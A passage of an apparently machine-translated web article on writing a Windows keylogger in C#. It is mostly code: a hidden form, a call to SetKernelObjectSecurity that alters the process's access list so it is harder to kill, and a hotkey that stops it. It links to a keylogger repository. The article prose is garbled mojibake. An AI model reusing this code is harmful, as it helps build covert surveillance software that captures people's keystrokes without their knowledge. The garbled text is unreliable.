class="hljs-keyword">byte</span></span>[bufSizeNeeded], bufSizeNeeded, <span class="hljs-keyword"><span class="hljs-keyword">out</span></span> bufSizeNeeded)) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Win32Exception(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> RawSecurityDescriptor(psd, <span class="hljs-number"><span class="hljs-number">0</span></span>); }</code> </pre><br> æ›´æ”¹æè¿°ç¬¦åï¼Œæ‚¨éœ€è¦å°†æ­¤ä¿¡æ¯è¾“å…¥å½“å‰è¿›ç¨‹ã€‚ åªéœ€å°†è¿›ç¨‹çš„æ ‡è¯†ç¬¦å’Œæè¿°ç¬¦ä¼ é€’ç»™ç³»ç»Ÿæ–¹æ³•<b>SetKernelObjectSecurityå³å¯</b> ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SetProcessSecurityDescriptor</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">IntPtr processHandle, RawSecurityDescriptor securityDescriptor</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> rawsd = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[securityDescriptor.BinaryLength]; securityDescriptor.GetBinaryForm(rawsd, <span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!SetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, rawsd)) <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Win32Exception(); }</code> </pre><br> æœ€åä¸€æ­¥æ˜¯ä½¿ç”¨ç»„åˆé”®åœæ­¢è¯¥è¿‡ç¨‹ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SetHotKey</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">Keys key, IntPtr handle</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> modifiers = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((key &amp; Keys.Alt) == Keys.Alt) modifiers |= (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)CombineKeys.MOD_ALT; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((key &amp; Keys.Control) == Keys.Control) modifiers |= (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)CombineKeys.MOD_CONTROL; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((key &amp; Keys.Shift) == Keys.Shift) modifiers |= (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)CombineKeys.MOD_SHIFT; Keys keys = key &amp; ~Keys.Control &amp; ~Keys.Shift &amp; ~Keys.Alt; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> keyId = key.GetHashCode(); RegisterHotKey(handle, keyId, modifiers, (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)keys); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> keyId; }</code> </pre><br> è¿™é‡Œçš„<b>key</b>æ˜¯é”®ç›˜å¿«æ·é”®ï¼Œ <b>handleæ˜¯</b>éšè—è¡¨å•<b>çš„</b>æ ‡è¯†ç¬¦ã€‚ ä¸ºäº†è¯†åˆ«è¡¨å•ä¸Šçš„æŒ‰é”®ç»„åˆï¼Œå°†åˆ›å»º<b>keyId</b> ï¼Œé€šè¿‡å®ƒå¯ä»¥æ£€æŸ¥æŒ‰é”®ç»„åˆçš„æ“ä½œã€‚ æ‰€æœ‰è¿™äº›éƒ½æ˜¯é€šè¿‡Win APIæ–¹æ³•<b>RegisterHotKey</b>ç¼–å†™çš„ã€‚ <br><br> ä¸ºäº†æœ€ç»ˆåœæ­¢è¯¥è¿‡ç¨‹ï¼Œæˆ‘ä»¬é‡æ–°å®šä¹‰äº†<b>WndProc</b>æ–¹æ³•çš„å½¢å¼ã€‚ <br><br><pre> <code class="cs hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">override</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">WndProc</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">ref</span></span></span></span><span class="hljs-function"><span class="hljs-params"> Message m</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (m.Msg == (<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)CombineKeys.WM_HOTKEY) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((<span class="hljs-keyword"><span class="hljs-keyword">int</span></span>)m.WParam == KeyId) { UnregisterHotKey(Handle, KeyId); Application.Exit(); } } <span class="hljs-keyword"><span class="hljs-keyword">base</span></span>.WndProc(<span class="hljs-keyword"><span class="hljs-keyword">ref</span></span> m); }</code> </pre><br>  <b>æœ‰ç”¨çš„é“¾æ¥ï¼š</b> <br><br>  <a href="https://github.com/mr-meeseeks-code/windows-key-logger">èµ„æ–™åº“é“¾æ¥</a> <br>  <a href="https://docs.microsoft.com/ru-ru/windows/win32/api/winuser/">é“¾æ¥åˆ°MSæ–‡æ¡£ã€‚</a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN482644/">https://habr.com/ru/post/zh-CN482644/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN482622/index.html">é›¨ä¸­è·‘æ­¥æ¨¡æ‹Ÿ</a></li>
<li><a href="../zh-CN482626/index.html">ä½¿ç”¨Logger.Backendsç›‘è§†åº”ç”¨ç¨‹åº</a></li>
<li><a href="../zh-CN482628/index.html">è§‚çœ‹â€œæ—¶é—´çš„å°ç»¿èœ˜è››â€</a></li>
<li><a href="../zh-CN482636/index.html">åœ¨å¾·å›½æ¥å—æ²»å®‰æ³•å®˜çš„ç»éªŒï¼ˆè¯¦ç»†åˆ†æï¼‰</a></li>
<li><a href="../zh-CN482642/index.html">OSCDï¼šå¨èƒæ£€æµ‹Sprintï¼ƒ1ï¼Œç»“æœ</a></li>
<li><a href="../zh-CN482646/index.html">é€šè¿‡å°†Angularåº“åˆ†ä¸ºå‡ éƒ¨åˆ†æ¥æé«˜SPAæ€§èƒ½</a></li>
<li><a href="../zh-CN482648/index.html">Arthur Khachuyanï¼šâ€œå¹¿å‘Šä¸­çš„çœŸæ­£å¤§æ•°æ®â€</a></li>
<li><a href="../zh-CN482650/index.html">å°†Yealink W80Bå¾®èœ‚çªIP-DECTç³»ç»Ÿè¿æ¥åˆ°3CX</a></li>
<li><a href="../zh-CN482652/index.html">ç»™åˆå­¦è€…çš„ä¿¡ï¼Œä»¥å­¦ä¹ æ•°æ®ç§‘å­¦</a></li>
<li><a href="../zh-CN482656/index.html">å–·æ°”æœºç¿¼ä¼Šå¤«Â·ç½—è¥¿ï¼ˆYves Rossiï¼‰ï¼šè‡ªä¸»å‚ç›´èµ·é™</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>